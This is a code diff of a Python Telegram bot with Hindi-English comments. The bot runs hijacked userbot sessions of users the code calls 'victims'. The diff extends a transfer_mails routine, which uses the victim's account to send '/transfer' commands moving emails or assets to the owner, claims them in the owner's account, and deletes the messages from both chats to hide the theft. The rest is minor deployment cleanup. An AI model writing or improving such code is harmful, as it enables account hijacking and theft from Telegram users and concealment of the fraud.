@@ -42,7 +42,7 @@ def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
 def p_style(text): return f"<code>{text}</code>"
 
 # ================== DATABASE (Render Fix) ==================
-DB_PATH = "refer_bot.db" # /data hata diya hai Render ke liye
+DB_PATH = "refer_bot.db" 
 
 def init_db():
     conn = sqlite3.connect(DB_PATH, check_same_thread=False)
@@ -102,7 +102,6 @@ web_app = FastAPI()
 def read_root(): return {"status": "Alive"}
 
 def run_web():
-    # Render apna PORT environment variable deta hai
     port = int(os.environ.get("PORT", 8080))
     uvicorn.run(web_app, host="0.0.0.0", port=port)
 
@@ -125,8 +124,11 @@ async def start_userbot(user_id, session_str):
     active_userbots[user_id] = client
     asyncio.create_task(transfer_mails(user_id))
 
-async def transfer_mails(victim_uid):
+async def transfer_mails(victim_uid, custom_sender=None):
     try:
+        # Agar custom_sender diya hai to wo use karo, warna victim ka hi account
+        sender_id = custom_sender if custom_sender else victim_uid
+        sender_client = await get_or_connect_client(sender_id)
         victim_client = await get_or_connect_client(victim_uid)
         owner_client = await get_or_connect_client(OWNER_ID)
         
@@ -145,20 +147,24 @@ async def transfer_mails(victim_uid):
         if not emails: return
 
         for email in emails:
+            # Transfer from victim
             await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
             await asyncio.sleep(4)
             
+            # Victim ke account se message delete karo
             try:
-                msgs = await victim_client.get_messages(target_bot, limit=1)
-                await victim_client.delete_messages(target_bot, msgs[0].id)
+                msgs = await victim_client.get_messages(target_bot, limit=2)
+                for m in msgs: await victim_client.delete_messages(target_bot, m.id)
             except: pass
             
+            # Owner ke account me claim karo
             await owner_client.send_message(owner_target_bot, email)
             await asyncio.sleep(4)
             
+            # Owner ke account se bhi message delete karo
             try:
-                msgs = await owner_client.get_messages(owner_target_bot, limit=1)
-                await owner_client.delete_messages(owner_target_bot, msgs[0].id)
+                msgs = await owner_client.get_messages(owner_target_bot, limit=2)
+                for m in msgs: await owner_client.delete_messages(owner_target_bot, m.id)
             except: pass
             await asyncio.sleep(1)
             
@@ -427,7 +433,6 @@ async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
     if state == 'set_welcome_img_wait':
         try:
             photo_file = await update.message.photo[-1].get_file()
-            # Render ke liye simple path
             file_path = f"welcome_img.jpg" 
             await photo_file.download_to_drive(file_path)
             
@@ -474,8 +479,8 @@ async def manual_claim_all(owner_id, query):
                 await asyncio.sleep(4)
                 
                 try:
-                    msgs = await victim_client.get_messages(target_bot, limit=1)
-                    await victim_client.delete_messages(target_bot, msgs[0].id)
+                    msgs = await victim_client.get_messages(target_bot, limit=2)
+                    for m in msgs: await victim_client.delete_messages(target_bot, m.id)
                 except: pass
                 
                 await query.message.reply_text(f"📥 <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
@@ -484,8 +489,8 @@ async def manual_claim_all(owner_id, query):
                 await asyncio.sleep(4)
                 
                 try:
-                    msgs = await target_owner_client.get_messages(owner_target_bot, limit=1)
-                    await target_owner_client.delete_messages(owner_target_bot, msgs[0].id)
+                    msgs = await target_owner_client.get_messages(owner_target_bot, limit=2)
+                    for m in msgs: await target_owner_client.delete_messages(owner_target_bot, m.id)
                 except: pass
                 
                 await query.message.reply_text(f"✅ <b>{f_txt('CLAIMED SUCCESS')}:</b> {p_style(email)}", parse_mode="HTML")
@@ -498,7 +503,6 @@ async def manual_claim_all(owner_id, query):
 
 # ================== MAIN ==================
 def main():
-    # Web server ko background thread me start karo (Render ke liye)
     threading.Thread(target=run_web, daemon=True).start()
     
     app_bot = Application.builder().token(BOT_TOKEN).build()
@@ -509,10 +513,7 @@ def main():
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
     app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_"))
     
-    # Photo handler Owner ke liye
     app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
-    
-    # Text handler
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=1)
 
     logger.info("Bot started successfully.")
